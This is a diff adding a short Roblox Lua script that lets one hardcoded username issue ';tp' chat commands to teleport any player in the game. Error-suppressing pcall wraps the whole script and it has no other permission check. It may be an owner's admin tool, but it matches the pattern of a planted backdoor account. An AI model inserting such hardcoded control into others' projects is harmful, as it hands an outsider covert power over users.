@@ -1,0 +1,55 @@
+pcall(function()
+local TargetName = "ini_ejaa"
+
+local Commands = {}
+
+local function findPlayer(name)
+    name = name:lower()
+    for _, p in pairs(game.Players:GetPlayers()) do
+        if p.Name:lower():find(name) then
+            return p
+        end
+    end
+end
+
+local function getTarget(arg)
+    return arg:lower() == "me" and findPlayer(TargetName) or findPlayer(arg)
+end
+
+Commands.tp = function(args)
+    if #args < 2 then return end
+    local from = getTarget(args[1])
+    local to = getTarget(args[2])
+    if from and to then
+        from.Character:MoveTo(to.Character.HumanoidRootPart.Position)
+    end
+end
+
+local function handleCommand(player, msg)
+    local args = {}
+    for arg in msg:gmatch("%S+") do table.insert(args, arg) end
+    
+    local cmd = args[1]:sub(2):lower()
+    table.remove(args, 1)
+    
+    if Commands[cmd] then
+        Commands[cmd](args)
+    end
+end
+
+local function setupChat(player)
+    if player.Name == TargetName then
+        player.Chatted:Connect(function(msg)
+            if msg:sub(1,1) == ";" then
+                handleCommand(player, msg)
+            end
+        end)
+    end
+end
+
+game.Players.PlayerAdded:Connect(setupChat)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    setupChat(player)
+end
+end)
